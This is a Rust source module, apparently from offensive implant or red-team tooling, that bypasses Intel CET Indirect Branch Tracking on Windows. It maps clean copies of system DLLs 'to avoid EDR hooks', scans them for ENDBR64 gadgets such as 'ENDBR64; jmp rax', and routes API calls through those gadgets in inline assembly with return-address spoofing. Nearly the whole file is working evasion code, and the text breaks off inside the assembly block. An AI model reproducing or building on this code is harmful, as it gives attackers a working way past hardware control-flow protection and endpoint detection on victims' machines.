// Indirect Branch Tracking (IBT) Bypass for Intel CET
//
// Intel CET's Indirect Branch Tracking (IBT) is a hardware-enforced CFI
// mechanism that requires every valid indirect call/jump target to begin
// with an `ENDBR64` instruction (encoded as `F3 0F 1E FA`).  When IBT is
// active, the CPU raises a `#CP` (Control Protection) exception if an
// indirect branch lands on an instruction that is NOT an ENDBR64.
//
// ## IBT Detection
//
// IBT availability is reported via CPUID leaf 7, sub-leaf 0, EDX bit 20:
//   CPUID.07H:EDX[20] = 1  →  CET IBT supported by CPU
//
// Note: CPU support does not mean IBT is **enabled** — the OS must opt in
// via the CET IBT mitigation policy.  On Windows 10 20H1+ and Windows 11,
// IBT may be enabled for processes that opt in via CET-compatible binaries.
//
// ## Bypass Strategy
//
// Rather than trying to disable IBT at the process level (which may not be
// possible), we **reuse** existing ENDBR64 gadgets found in large system
// binaries (ntdll, kernel32, kernelbase, msvcrt, combase).  In these large
// DLLs, there are hundreds of ENDBR64 instructions — some at legitimate
// function entry points, and some in unusual locations that can serve as
// CFI-valid gadgets.
//
// The key insight: an ENDBR64 followed by `jmp rax` is an IBT-valid
// indirect dispatch.  We find such gadgets in clean-mapped DLLs (avoiding
// EDR hooks) and use them as trampolines:
//
//   1. Set RAX = api_addr (the actual target)
//   2. Jump to the ENDBR64; jmp rax gadget
//   3. IBT check: target has ENDBR64 → passes
//   4. `jmp rax` → dispatches to api_addr
//   5. The API function executes normally
//
// ## ENDBR64 Instruction Encoding
//
// The ENDBR64 instruction is 4 bytes: `F3 0F 1E FA`
//   - F3       = REP prefix (used here as a NOP for IBT marking)
//   - 0F 1E    = NOP with hint (the "ENDBR" opcode space)
//   - FA       = indicates ENDBR64 (vs FB for ENDBR32)
//
// On CPUs without CET support, this sequence executes as a 4-byte NOP.
// On CET-capable CPUs with IBT enabled, it marks a valid indirect branch
// target.
//
// ## Gadget Categories
//
// Each found ENDBR64 is categorized by what follows it:
//
//   FunctionEntry — ENDBR64 at the beginning of an exported function.
//     The most common case.  These are legitimate indirect call targets.
//     Value: can be used as-is for IBT-safe indirect dispatch.
//
//   MidFunction — ENDBR64 in the middle of a function body.  Unusual,
//     typically occurs at exception handler entry points or after
//     indirect branch landing pads.  High value for gadget use.
//
//   AfterNop — ENDBR64 after alignment NOPs (CC CC CC... or 90 90...).
//     Alignment artifacts that happen to contain ENDBR64.  Usable but
//     the preceding NOPs/int3s may confuse analysis.
//
//   ExceptionEntry — ENDBR64 at exception handler or unwind entry.
//     Specific to exception dispatch paths.  Lower value for general
//     gadget use but still IBT-valid.
//
// ## Gadget Operations
//
// After finding an ENDBR64, we analyze the instructions that follow it
// (up to 64 bytes forward) to determine what operations the gadget can
// perform:
//
//   JmpReg(n)  — `jmp` to a register (e.g., `jmp rax` = FF E0, `jmp r11` = 41 FF E3)
//   CallReg(n) — `call` to a register (e.g., `call rax` = FF D0)
//   Ret        — `ret` (C3)
//   Syscall    — `syscall` (0F 05), optionally followed by `ret`
//   Nop        — NOP or NOP-like instruction (no useful operation)
//
// ## Integration with spoof_call
//
// The `ibt_safe_spoof_call` function wraps the existing `spoof_call` by:
//   1. Finding an IBT-valid `ENDBR64; jmp rax` gadget
//   2. Using it as a trampoline: the API call goes through the gadget
//   3. The gadget's ENDBR64 satisfies IBT's indirect branch check
//
// When IBT is not active, all functions return gracefully (no-ops) so
// the existing `spoof_call` path is used unchanged.
//
// ## Graceful Degradation
//
// - If the CPU doesn't support IBT: all functions return Ok/None (no-op)
// - If IBT is supported but no suitable gadgets are found: return error,
//   caller falls back to existing behavior
// - If ENDBR64 scanning fails (e.g., module not found): log warning, skip
//
// Windows x86_64 only.  Feature-gated behind `cet-bypass`.

#![cfg(all(windows, feature = "cet-bypass", target_arch = "x86_64"))]

use std::sync::atomic::{AtomicBool, Ordering};

// ─── Constants ────────────────────────────────────────────────────────────

/// CPUID leaf 7, sub-leaf 0, EDX bit 20 = CET IBT support.
const CPUID_IBT_BIT: u32 = 20;

/// ENDBR64 instruction encoding: F3 0F 1E FA (4 bytes).
const ENDBR64: [u8; 4] = [0xF3, 0x0F, 0x1E, 0xFA];

/// Maximum number of bytes to analyze after an ENDBR64 for gadget ops.
const GADGET_ANALYSIS_LEN: usize = 64;

/// Maximum number of ENDBR64 gadgets to collect per module.
const MAX_GADGETS_PER_MODULE: usize = 4096;

/// DLL names to scan for IBT gadgets (in order of preference).
const TARGET_DLLS: &[&str] = &[
    "ntdll.dll",
    "kernel32.dll",
    "kernelbase.dll",
    "msvcrt.dll",
    "combase.dll",
];

// ─── Global State ─────────────────────────────────────────────────────────

/// Whether the CPU supports CET IBT.
static IBT_AVAILABLE: AtomicBool = AtomicBool::new(false);

/// Whether IBT bypass has been initialized and the gadget database built.
static IBT_INITIALIZED: AtomicBool = AtomicBool::new(false);

// ─── Data Structures ──────────────────────────────────────────────────────

/// Category of an ENDBR64 gadget based on its position in the code.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EndbrCategory {
    /// ENDBR64 at the beginning of an exported function (legitimate target).
    FunctionEntry,
    /// ENDBR64 in the middle of a function (unusual, high-value gadget).
    MidFunction,
    /// ENDBR64 after padding NOPs/int3s (alignment artifact).
    AfterNop,
    /// ENDBR64 at exception handler entry.
    ExceptionEntry,
}

impl std::fmt::Display for EndbrCategory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::FunctionEntry => write!(f, "FunctionEntry"),
            Self::MidFunction => write!(f, "MidFunction"),
            Self::AfterNop => write!(f, "AfterNop"),
            Self::ExceptionEntry => write!(f, "ExceptionEntry"),
        }
    }
}

/// A gadget operation found after an ENDBR64 instruction.
///
/// The register number is the x86-64 register encoding:
///   0 = rax, 1 = rcx, 2 = rdx, 3 = rbx, 4 = rsp, 5 = rbp,
///   6 = rsi, 7 = rdi, 8 = r8, ..., 15 = r15
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum GadgetOp {
    /// `jmp` to register (e.g., `jmp rax` = FF E0, `jmp r11` = 41 FF E3).
    JmpReg(u8),
    /// `call` to register (e.g., `call rax` = FF D0).
    CallReg(u8),
    /// `ret` (C3) or `ret imm16` (C2 xx xx).
    Ret,
    /// `syscall` (0F 05), optionally followed by `ret`.
    Syscall,
    /// NOP or NOP-like instruction (no useful operation).
    Nop,
}

impl std::fmt::Display for GadgetOp {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::JmpReg(n) => write!(f, "JmpReg({})", reg_name(*n)),
            Self::CallReg(n) => write!(f, "CallReg({})", reg_name(*n)),
            Self::Ret => write!(f, "Ret"),
            Self::Syscall => write!(f, "Syscall"),
            Self::Nop => write!(f, "Nop"),
        }
    }
}

/// Return the x86-64 register name for a register number.
fn reg_name(n: u8) -> &'static str {
    match n {
        0 => "rax",
        1 => "rcx",
        2 => "rdx",
        3 => "rbx",
        4 => "rsp",
        5 => "rbp",
        6 => "rsi",
        7 => "rdi",
        8 => "r8",
        9 => "r9",
        10 => "r10",
        11 => "r11",
        12 => "r12",
        13 => "r13",
        14 => "r14",
        15 => "r15",
        _ => "???",
    }
}

/// An ENDBR64 gadget found during scanning.
#[derive(Debug, Clone)]
pub struct EndbrGadget {
    /// Address of the ENDBR64 instruction.
    pub addr: usize,
    /// Category based on position analysis.
    pub category: EndbrCategory,
    /// Raw bytes of the instructions after the ENDBR64 (up to 64 bytes).
    pub next_instr: Vec<u8>,
    /// Operations found after the ENDBR64.
    pub reachable_ops: Vec<GadgetOp>,
}

/// IBT-valid gadget database, organized by operation type.
#[derive(Debug, Clone, Default)]
pub struct IbtGadgetDb {
    /// Gadgets where ENDBR64 is followed by `jmp rax` (FF E0).
    pub jmp_rax: Vec<EndbrGadget>,
    /// Gadgets where ENDBR64 is followed by `jmp rcx` (FF E1).
    pub jmp_rcx: Vec<EndbrGadget>,
    /// Gadgets where ENDBR64 is followed by `jmp rdx` (FF E2).
    pub jmp_rdx: Vec<EndbrGadget>,
    /// Gadgets where ENDBR64 is followed by `jmp r11` (41 FF E3).
    pub jmp_r11: Vec<EndbrGadget>,
    /// Gadgets where ENDBR64 is followed by `call rax` (FF D0).
    pub call_rax: Vec<EndbrGadget>,
    /// All gadgets where ENDBR64 is followed by `ret` (C3).
    pub ret_gadgets: Vec<EndbrGadget>,
    /// All gadgets where ENDBR64 is followed by `syscall` (0F 05).
    pub syscall_gadgets: Vec<EndbrGadget>,
    /// All unsorted ENDBR64 gadgets (for debugging/analysis).
    pub all_gadgets: Vec<EndbrGadget>,
}

/// Result type for IBT bypass operations.
pub type IbtResult<T> = Result<T, IbtError>;

/// Errors that can occur during IBT bypass operations.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum IbtError {
    /// IBT is not supported by this CPU.
    NotSupported,
    /// IBT is not enabled (available but inactive).
    NotEnabled,
    /// No suitable gadgets found in scanned modules.
    NoGadgetsFound,
    /// Module not found or could not be mapped.
    ModuleNotFound(String),
    /// Scanning failed (invalid PE, unreadable section, etc.).
    ScanFailed(String),
    /// Database not initialized.
    NotInitialized,
    /// Gadget database is empty after initialization.
    DatabaseEmpty,
}

impl std::fmt::Display for IbtError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::NotSupported => write!(f, "IBT not supported by CPU"),
            Self::NotEnabled => write!(f, "IBT not enabled"),
            Self::NoGadgetsFound => write!(f, "no suitable ENDBR64 gadgets found"),
            Self::ModuleNotFound(name) => write!(f, "module not found: {}", name),
            Self::ScanFailed(reason) => write!(f, "scan failed: {}", reason),
            Self::NotInitialized => write!(f, "IBT bypass not initialized"),
            Self::DatabaseEmpty => write!(f, "gadget database is empty"),
        }
    }
}

impl std::error::Error for IbtError {}

// ─── CPU Feature Detection ────────────────────────────────────────────────

/// Check whether the CPU supports CET IBT.
///
/// Queries CPUID leaf 7, sub-leaf 0, EDX bit 20.
fn cpuid_ibt_supported() -> bool {
    #[cfg(target_arch = "x86_64")]
    {
        unsafe {
            let result = core::arch::x86_64::__cpuid(0x00000007);
            (result.edx >> CPUID_IBT_BIT) & 1 == 1
        }
    }

    #[cfg(not(target_arch = "x86_64"))]
    {
        false
    }
}

// ─── PE Section Helpers ───────────────────────────────────────────────────

/// Find the `.text` section in a PE image and return (virtual_address, virtual_size).
///
/// Returns `None` if the PE is invalid or has no `.text` section.
unsafe fn find_text_section(base: usize) -> Option<(usize, usize)> {
    let dos_e_lfanew = *(base as *const u32).add(0x3C / 4) as usize;
    let pe_offset = base + dos_e_lfanew;

    // Validate PE signature ("PE\0\0").
    let pe_sig = *(pe_offset as *const u32);
    if pe_sig != 0x0000_4550 {
        return None;
    }

    let num_sections = *((pe_offset + 6) as *const u16) as usize;
    let optional_header_size = *((pe_offset + 20) as *const u16) as usize;
    let section_start = pe_offset + 24 + optional_header_size;

    for i in 0..num_sections {
        let sec_addr = section_start + i * 40;
        let name_ptr = sec_addr as *const u8;
        let name = std::slice::from_raw_parts(name_ptr, 8);

        // Match ".text" — compare first 5 bytes, remaining 3 may be padding.
        if name[0] == b'.'
            && name[1] == b't'
            && name[2] == b'e'
            && name[3] == b'x'
            && name[4] == b't'
        {
            let virtual_size = *((sec_addr + 8) as *const u32) as usize;
            let virtual_address = *((sec_addr + 12) as *const u32) as usize;
            return Some((base + virtual_address, virtual_size));
        }
    }

    None
}

// ─── Instruction Decoding (minimal) ───────────────────────────────────────

/// Decode operations from a byte stream (instructions after an ENDBR64).
///
/// This is a minimal decoder — it only recognizes the instruction patterns
/// we care about for gadget classification.  Returns a list of operations
/// found in the byte stream.
fn decode_gadget_ops(bytes: &[u8]) -> Vec<GadgetOp> {
    let mut ops = Vec::new();
    let mut i = 0;

    while i < bytes.len() {
        let b0 = bytes[i];

        // Check for REX prefix (0x40–0x4F) which extends register encoding.
        let (rex, payload_start) = if b0 >= 0x40 && b0 <= 0x4F {
            if i + 1 >= bytes.len() {
                break;
            }
            (b0, i + 1)
        } else {
            (0u8, i)
        };

        if payload_start >= bytes.len() {
            break;
        }

        let op_byte = bytes[payload_start];

        // `jmp reg` patterns:
        //   FF /4 r/m64  →  FF [ModRM] where reg field = 4
        //   With REX.B: extends the register number by 8
        if op_byte == 0xFF && payload_start + 1 < bytes.len() {
            let modrm = bytes[payload_start + 1];
            let reg_field = (modrm >> 3) & 0x7;
            let mod_field = modrm >> 6;

            // reg=4 is JMP, mod=3 means register operand (not memory).
            if reg_field == 4 && mod_field == 3 {
                let rm = modrm & 0x7;
                let reg_num = if (rex & 0x01) != 0 { rm + 8 } else { rm };
                ops.push(GadgetOp::JmpReg(reg_num));
                i = payload_start + 2;
                continue;
            }
            // Also handle mod=0 (memory indirect): jmp [reg]
            // This is less useful but still a dispatch.
        }

        // `call reg` patterns:
        //   FF /2 r/m64  →  FF [ModRM] where reg field = 2
        if op_byte == 0xFF && payload_start + 1 < bytes.len() {
            let modrm = bytes[payload_start + 1];
            let reg_field = (modrm >> 3) & 0x7;
            let mod_field = modrm >> 6;

            if reg_field == 2 && mod_field == 3 {
                let rm = modrm & 0x7;
                let reg_num = if (rex & 0x01) != 0 { rm + 8 } else { rm };
                ops.push(GadgetOp::CallReg(reg_num));
                i = payload_start + 2;
                continue;
            }
        }

        // `ret` patterns:
        //   C3 = near return
        //   C2 xx xx = near return with pop imm16
        if op_byte == 0xC3 {
            ops.push(GadgetOp::Ret);
            i = payload_start + 1;
            continue;
        }
        if op_byte == 0xC2 && payload_start + 2 < bytes.len() {
            ops.push(GadgetOp::Ret);
            i = payload_start + 3;
            continue;
        }

        // `syscall` pattern:
        //   0F 05 = syscall
        if op_byte == 0x0F && payload_start + 1 < bytes.len() && bytes[payload_start + 1] == 0x05 {
            ops.push(GadgetOp::Syscall);
            i = payload_start + 2;
            continue;
        }

        // NOP patterns:
        //   90 = NOP
        //   0F 1F xx... = multi-byte NOP
        //   66 xx (e.g., 66 90 = 66 NOP = XCHG eax, eax)
        if op_byte == 0x90 {
            ops.push(GadgetOp::Nop);
            i = payload_start + 1;
            continue;
        }
        if op_byte == 0x0F && payload_start + 1 < bytes.len() && bytes[payload_start + 1] == 0x1F {
            // Multi-byte NOP: 0F 1F /0 [imm...]
            // Length depends on ModRM and SIB.  Conservative: skip 3–8 bytes.
            let skip = if payload_start + 2 < bytes.len() {
                let modrm = bytes[payload_start + 2];
                let mod_f = modrm >> 6;
                match mod_f {
                    0 => 3, // Mod=00: at least 3 bytes
                    1 => 4, // Mod=01: 4 bytes
                    2 => 6, // Mod=10: 6 bytes
                    3 => 3, // Mod=11: 3 bytes (register operand)
                    _ => 3,
                }
            } else {
                3
            };
            ops.push(GadgetOp::Nop);
            i = payload_start + skip;
            continue;
        }

        // Unknown instruction — stop decoding (conservative approach).
        // We only want to classify gadgets we fully understand.
        break;
    }

    ops
}

/// Categorize an ENDBR64 gadget based on the bytes BEFORE it.
///
/// Analyzes up to 16 bytes before the ENDBR64 to determine if it's at:
/// - A function entry (preceded by CC padding or nothing)
/// - Mid-function (preceded by non-CC, non-90 code)
/// - After NOP padding (preceded by 90 or 66 90 padding)
/// - An exception entry (harder to detect; heuristically identified)
unsafe fn categorize_endbr(base: usize, endbr_addr: usize) -> EndbrCategory {
    let offset = endbr_addr - base;

    // Check the 16 bytes before the ENDBR64.
    let lookback = 16.min(offset);
    if lookback == 0 {
        // At the very start of the section — likely function entry.
        return EndbrCategory::FunctionEntry;
    }

    let before_start = endbr_addr - lookback;
    let before = std::slice::from_raw_parts(before_start as *const u8, lookback);

    // Count consecutive CC (int3) and 90 (NOP) bytes before the ENDBR64.
    let mut cc_count = 0usize;
    let mut nop_count = 0usize;
    for &b in before.iter().rev() {
        if b == 0xCC {
            cc_count += 1;
        } else if b == 0x90 {
            nop_count += 1;
        } else {
            break;
        }
    }

    // If preceded by >= 2 CC bytes, it's likely function entry padding.
    if cc_count >= 2 {
        return EndbrCategory::FunctionEntry;
    }

    // If preceded by >= 2 NOP bytes, it's alignment padding.
    if nop_count >= 2 {
        return EndbrCategory::AfterNop;
    }

    // Check for common function prologue patterns right before the ENDBR64.
    // These would indicate mid-function placement.
    if lookback >= 3 {
        let last3 = &before[lookback - 3..];

        // Common prologue suffixes before an indirect branch target:
        //   48 89 — mov [reg+off], reg (stack frame setup)
        //   48 83 — add/sub with immediate
        //   E8 xx xx xx xx — call relative (would be 5 bytes back)
        //   0F 85 — jnz near (conditional jump to this ENDBR)
        if last3[0] == 0x0F && last3[1] == 0x85 {
            // Conditional jump to this location — exception dispatch target.
            return EndbrCategory::ExceptionEntry;
        }
    }

    // If we got here and the byte immediately before is non-padding,
    // it's likely mid-function.
    if lookback >= 1 && before[lookback - 1] != 0xCC && before[lookback - 1] != 0x90 {
        return EndbrCategory::MidFunction;
    }

    // Default: function entry.
    EndbrCategory::FunctionEntry
}

// ─── ENDBR64 Scanner ──────────────────────────────────────────────────────

/// Scan a module's `.text` section for all ENDBR64 gadgets.
///
/// For each ENDBR64 found:
///   1. Records the address
///   2. Analyzes instructions AFTER (up to 64 bytes) for gadget operations
///   3. Analyzes bytes BEFORE for categorization
///
/// Returns a vector of discovered gadgets, sorted by address.
///
/// # Safety
///
/// - `module_base` must point to a valid, mapped PE image.
/// - `module_size` must not exceed the actual mapped image size.
pub unsafe fn scan_module_for_endbr(
    module_base: usize,
    module_size: usize,
) -> IbtResult<Vec<EndbrGadget>> {
    let text = find_text_section(module_base)
        .ok_or_else(|| IbtError::ScanFailed("could not find .text section".to_string()))?;

    let (text_start, text_size) = text;
    if text_size < ENDBR64.len() {
        return Ok(Vec::new());
    }

    let code = std::slice::from_raw_parts(text_start as *const u8, text_size);
    let mut gadgets = Vec::new();

    // Scan for the ENDBR64 byte pattern.
    let mut i = 0;
    while i <= text_size - ENDBR64.len() {
        if code[i..i + 4] == ENDBR64 {
            let addr = text_start + i;

            // Categorize based on preceding bytes.
            let category = categorize_endbr(module_base, addr);

            // Analyze instructions after the ENDBR64.
            let after_start = i + ENDBR64.len();
            let after_len = GADGET_ANALYSIS_LEN.min(text_size - after_start);
            let next_bytes = if after_len > 0 {
                code[after_start..after_start + after_len].to_vec()
            } else {
                Vec::new()
            };

            let reachable_ops = decode_gadget_ops(&next_bytes);

            gadgets.push(EndbrGadget {
                addr,
                category,
                next_instr: next_bytes,
                reachable_ops,
            });

            // Skip past this ENDBR64 (it's 4 bytes, so advance by at least 1).
            i += 4;

            // Early exit if we've collected enough gadgets.
            if gadgets.len() >= MAX_GADGETS_PER_MODULE {
                log::debug!(
                    "ibt_bypass: reached max gadgets ({}) for module at {:#x}",
                    MAX_GADGETS_PER_MODULE,
                    module_base,
                );
                break;
            }
        } else {
            i += 1;
        }
    }

    log::info!(
        "ibt_bypass: found {} ENDBR64 gadgets in module at {:#x} (size {:#x})",
        gadgets.len(),
        module_base,
        module_size,
    );

    Ok(gadgets)
}

// ─── Gadget Database Builder ──────────────────────────────────────────────

/// Build the IBT gadget database by scanning clean-mapped copies of
/// target system DLLs.
///
/// Scans the following DLLs (in order):
///   ntdll.dll, kernel32.dll, kernelbase.dll, msvcrt.dll, combase.dll
///
/// Each DLL is mapped via `map_clean_dll` to avoid EDR hooks.  The ENDBR64
/// scanner categorizes gadgets, and they are indexed by operation type.
///
/// Returns the populated gadget database.
pub fn build_ibt_gadget_database() -> IbtResult<IbtGadgetDb> {
    let mut db = IbtGadgetDb::default();

    for &dll_name in TARGET_DLLS {
        // Map the DLL cleanly (avoids EDR hooks).
        let base = match crate::syscalls::map_clean_dll(dll_name) {
            Ok(b) => b,
            Err(e) => {
                log::warn!(
                    "ibt_bypass: could not map clean {}: {} — skipping",
                    dll_name,
                    e
                );
                continue;
            }
        };

        // Get the SizeOfImage for bounds checking.
        let size = unsafe {
            let dos_e_lfanew = *((base + 0x3C) as *const u32) as usize;
            let opt_header = base + dos_e_lfanew + 0x18;
            *((opt_header + 0x38) as *const u32) as usize
        };

        // Scan for ENDBR64 gadgets.
        let gadgets = unsafe { scan_module_for_endbr(base, size) }?;

        log::info!(
            "ibt_bypass: scanned {} — {} ENDBR64 gadgets found",
            dll_name,
            gadgets.len(),
        );

        // Classify gadgets into the database by operation type.
        for g in gadgets {
            // Check what operations this gadget provides.
            for &op in &g.reachable_ops {
                match op {
                    GadgetOp::JmpReg(0) => {
                        // ENDBR64; jmp rax — our primary target.
                        if db.jmp_rax.len() < 32 {
                            db.jmp_rax.push(g.clone());
                        }
                    }
                    GadgetOp::JmpReg(1) => {
                        if db.jmp_rcx.len() < 32 {
                            db.jmp_rcx.push(g.clone());
                        }
                    }
                    GadgetOp::JmpReg(2) => {
                        if db.jmp_rdx.len() < 32 {
                            db.jmp_rdx.push(g.clone());
                        }
                    }
                    GadgetOp::JmpReg(11) => {
                        // ENDBR64; jmp r11 — useful for spoof_call (which uses r11 for API).
                        if db.jmp_r11.len() < 32 {
                            db.jmp_r11.push(g.clone());
                        }
                    }
                    GadgetOp::CallReg(0) => {
                        if db.call_rax.len() < 32 {
                            db.call_rax.push(g.clone());
                        }
                    }
                    GadgetOp::Ret => {
                        if db.ret_gadgets.len() < 64 {
                            db.ret_gadgets.push(g.clone());
                        }
                    }
                    GadgetOp::Syscall => {
                        if db.syscall_gadgets.len() < 32 {
                            db.syscall_gadgets.push(g.clone());
                        }
                    }
                    GadgetOp::Nop | GadgetOp::JmpReg(_) | GadgetOp::CallReg(_) => {
                        // Other register targets — stored in all_gadgets only.
                    }
                }
            }
            db.all_gadgets.push(g);
        }
    }

    // Log database summary.
    log::info!(
        "ibt_bypass: gadget database built — jmp_rax={} jmp_rcx={} jmp_rdx={} \
         jmp_r11={} call_rax={} ret={} syscall={} total={}",
        db.jmp_rax.len(),
        db.jmp_rcx.len(),
        db.jmp_rdx.len(),
        db.jmp_r11.len(),
        db.call_rax.len(),
        db.ret_gadgets.len(),
        db.syscall_gadgets.len(),
        db.all_gadgets.len(),
    );

    Ok(db)
}

// ─── Initialization ───────────────────────────────────────────────────────

/// Static gadget database, built once at initialization.
static GADGET_DB: std::sync::OnceLock<IbtGadgetDb> = std::sync::OnceLock::new();

/// Initialize the IBT bypass subsystem.
///
/// Checks CPU IBT support and, if available, builds the gadget database
/// by scanning clean-mapped system DLLs.
///
/// Returns `true` if IBT bypass is ready for use.
pub fn init_ibt_bypass() -> bool {
    if IBT_INITIALIZED.load(Ordering::Acquire) {
        return IBT_AVAILABLE.load(Ordering::Acquire)
            && !GADGET_DB.get().map_or(true, |db| db.all_gadgets.is_empty());
    }

    let cpu_supports = cpuid_ibt_supported();

    if !cpu_supports {
        log::info!("ibt_bypass: CPU does not support CET IBT (CPUID.07H:EDX[20]=0)");
        IBT_AVAILABLE.store(false, Ordering::Release);
        IBT_INITIALIZED.store(true, Ordering::Release);
        return false;
    }

    log::info!("ibt_bypass: CPU supports CET IBT (CPUID.07H:EDX[20]=1)");

    // Build the gadget database.
    match build_ibt_gadget_database() {
        Ok(db) => {
            let total = db.all_gadgets.len();
            let usable = db.jmp_rax.len() + db.jmp_r11.len() + db.call_rax.len();

            if usable == 0 {
                log::warn!(
                    "ibt_bypass: {} ENDBR64 gadgets found but none are usable \
                     (need ENDBR64; jmp rax or ENDBR64; jmp r11)",
                    total,
                );
                IBT_AVAILABLE.store(false, Ordering::Release);
            } else {
                log::info!(
                    "ibt_bypass: {} total gadgets, {} usable (jmp_rax={}, jmp_r11={}, call_rax={})",
                    total,
                    usable,
                    db.jmp_rax.len(),
                    db.jmp_r11.len(),
                    db.call_rax.len(),
                );
                IBT_AVAILABLE.store(true, Ordering::Release);
            }

            let _ = GADGET_DB.set(db);
        }
        Err(e) => {
            log::warn!("ibt_bypass: failed to build gadget database: {}", e);
            IBT_AVAILABLE.store(false, Ordering::Release);
        }
    }

    IBT_INITIALIZED.store(true, Ordering::Release);
    IBT_AVAILABLE.load(Ordering::Acquire)
}

/// Check whether IBT bypass is available.
///
/// Returns `true` if:
/// 1. The CPU supports CET IBT
/// 2. The gadget database has been built
/// 3. At least one usable gadget was found
pub fn is_ibt_bypass_available() -> bool {
    IBT_AVAILABLE.load(Ordering::Acquire)
}

/// Get a reference to the gadget database.
///
/// Returns `None` if the database hasn't been initialized.
pub fn get_gadget_db() -> Option<&'static IbtGadgetDb> {
    GADGET_DB.get()
}

// ─── IBT-Safe Execution ───────────────────────────────────────────────────

/// Find an IBT-valid gadget suitable for dispatching an indirect call via RAX.
///
/// Prefers:
///   1. `ENDBR64; jmp rax` — ideal for spoof_call (JMP to API via RAX)
///   2. `ENDBR64; call rax` — alternative for CALL-based dispatch
///   3. `ENDBR64; jmp r11` — usable when the API address is in R11
///
/// Returns the address of the ENDBR64 instruction, or `None` if no
/// suitable gadget is available.
pub fn find_ibt_dispatch_gadget() -> Option<usize> {
    let db = GADGET_DB.get()?;

    // Prefer ENDBR64; jmp rax — the cleanest dispatch.
    if let Some(g) = db.jmp_rax.first() {
        log::trace!(
            "ibt_bypass: using jmp_rax gadget at {:#x} ({})",
            g.addr,
            g.category,
        );
        return Some(g.addr);
    }

    // Fallback: ENDBR64; jmp r11 (spoof_call already uses R11 for API).
    if let Some(g) = db.jmp_r11.first() {
        log::trace!(
            "ibt_bypass: using jmp_r11 gadget at {:#x} ({})",
            g.addr,
            g.category,
        );
        return Some(g.addr);
    }

    // Fallback: ENDBR64; call rax (changes the shadow stack — less ideal).
    if let Some(g) = db.call_rax.first() {
        log::trace!(
            "ibt_bypass: using call_rax gadget at {:#x} ({})",
            g.addr,
            g.category,
        );
        return Some(g.addr);
    }

    log::warn!("ibt_bypass: no suitable IBT dispatch gadget found");
    None
}

/// IBT-safe indirect call wrapper.
///
/// When IBT is active, an indirect call to `api_addr` will fail unless the
/// target starts with ENDBR64.  This function dispatches the call through
/// an IBT-valid gadget:
///
///   1. Find an IBT-valid gadget: `ENDBR64; jmp rax`
///   2. Set RAX = api_addr
///   3. Jump to the gadget address
///   4. IBT checks: the gadget starts with ENDBR64 → passes
///   5. The gadget does `jmp rax` → jumps to api_addr
///   6. The API function executes normally
///
/// This is functionally equivalent to a direct indirect call but passes
/// IBT validation.
///
/// # Arguments
///
/// * `api_addr` — The target function to call.
/// * `args` — Arguments to pass (first 4 in registers, rest on stack).
///
/// # Returns
///
/// The return value from the called function (in RAX).
///
/// # Safety
///
/// - `api_addr` must be a valid function address.
/// - The gadget database must be initialized.
pub unsafe fn ibt_safe_spoof_call(
    api_addr: usize,
    gadget_addr: usize,
    arg1: u64,
    arg2: u64,
    arg3: u64,
    arg4: u64,
    stack_args: &[u64],
) -> IbtResult<u64> {
    let ibt_gadget = find_ibt_dispatch_gadget().ok_or(IbtError::NoGadgetsFound)?;

    log::trace!(
        "ibt_bypass: dispatching API call via IBT gadget at {:#x} → {:#x}",
        ibt_gadget,
        api_addr,
    );

    // Use the existing spoof_call with the IBT gadget as the initial target.
    // The flow is:
    //   1. spoof_call sets up the fake return address (gadget_addr / jmp rbx)
    //   2. Instead of `jmp r11` (API) directly, we do:
    //      a. Set RAX = api_addr
    //      b. `jmp ibt_gadget`  (which starts with ENDBR64)
    //      c. IBT gadget does `jmp rax` → API
    //
    // However, spoof_call's inline asm does `jmp r11` — we can't easily
    // change that.  Instead, we use a different approach:
    //
    // Set R11 = ibt_gadget (ENDBR64; jmp rax)
    // Set RAX = api_addr
    // spoof_call jumps to ibt_gadget via `jmp r11`
    // IBT: ibt_gadget has ENDBR64 → passes
    // ibt_gadget does `jmp rax` → api_addr
    // API executes normally
    //
    // But spoof_call's inline asm puts api_addr in R11...
    // We need to rethink this.
    //
    // Actually, looking at the spoof_call asm more carefully:
    //   mov r11, {api}     ← API address goes into R11
    //   mov r15, {gadget}  ← fake return addr goes into R15
    //   push r15           ← push fake return onto stack
    //   jmp r11            ← jump to API
    //
    // For IBT bypass, we need `jmp r11` to land on an ENDBR64.
    // But r11 = api_addr, which may not start with ENDBR64.
    //
    // Solution: change R11 to the IBT gadget, and put api_addr in RAX.
    // The IBT gadget does `jmp rax` → api_addr.
    //
    // We can't modify the inline asm in spoof_call without changing its
    // source.  So we provide our own inline asm that:
    //   1. Sets RAX = api_addr
    //   2. Sets R11 = ibt_gadget
    //   3. Does the same spoofing flow as spoof_call but jumps to ibt_gadget
    //
    // This duplicates some of spoof_call's logic but is necessary for
    // IBT compatibility.

    let status: u64;
    let nstack = stack_args.len();
    let stack_ptr = stack_args.as_ptr();

    // Determine the effective spoofed return address.
    let effective_gadget = {
        let tls_addr = crate::syscalls::get_spoof_ret();
        if tls_addr != 0 {
            tls_addr
        } else {
            gadget_addr
        }
    };

    std::arch::asm!(
        "push rbx",
        "push r14",
        "push r15",

        // RBX = continuation: after gadget fires (jmp rbx), control comes here.
        "lea rbx, [rip + 42f]",

        // Compute and reserve aligned stack space for shadow store + extra args.
        "mov r14, rsp",
        "mov rax, {nstack}",
        "shl rax, 3",
        "add rax, 0x28 + 15",
        "and rax, -16",
        "sub rsp, rax",

        // Copy extra (>4) arguments into the shadow-space area.
        "test {nstack}, {nstack}",
        "jz 41f",
        "mov rcx, {nstack}",
        "mov rsi, {stack_ptr}",
        "lea rdi, [rsp + 0x28]",
        "cld",
        "rep movsq",

        "41:",
        // Load the first four register arguments per the Windows x64 ABI.
        "mov rcx, {a1}",
        "mov rdx, {a2}",
        "mov r8,  {a3}",
        "mov r9,  {a4}",

        // IBT bypass: set RAX = api_addr, then jump to IBT gadget.
        // The IBT gadget is: ENDBR64; jmp rax
        // 1. IBT checks: the gadget starts with ENDBR64 → passes
        // 2. The gadget does `jmp rax` → dispatches to api_addr
        "mov rax, {api}",
        "mov r15, {gadget}",
        "push r15",
        "jmp {ibt_gadget}",

        // ── Continuation: gadget (jmp rbx) lands here ──────────────────
        "42:",
        "mov rsp, r14",
